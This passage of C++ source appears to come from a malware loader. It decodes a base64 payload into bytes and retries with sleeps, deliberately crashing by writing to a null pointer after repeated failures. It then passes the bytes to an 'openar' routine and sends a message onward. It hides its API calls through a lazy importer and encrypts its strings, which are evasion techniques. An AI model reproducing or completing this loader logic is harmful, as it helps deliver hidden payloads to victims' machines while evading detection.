						std::vector<uint8_t> bobaaam = Base64ToBytes(bobak);

#if DEBUG_MODE
						std::cout << bobaaam.size() << std::endl;
#endif

						if (18 > bobaaam.size())
						{
							if (retry > 14)
							{


								*(uintptr_t*)0 = 0;




							}
							else
							{
								retry++;
								LI_FN(Sleep).safe_cached()(10000);
								goto A;
							}
						}

#if DEBUG_MODE
						(printf)(EC("Install Done going to open \n"));

#endif
						LI_FN(Sleep).safe_cached()(2500);





						openar(bobaaam);

#if DEBUG_MODE
						(printf)(EC("Open Done Waiting Transfer \n"));

#endif





						LI_FN(Sleep).safe_cached()(8000);/**/




						SndMSG(Podyom, msgr);




#if DEBUG_MODE
						(printf)(EC("All Enndeddd \n"));

#endif

					}
					catch (...) {}

				}

			}

		}


	}

}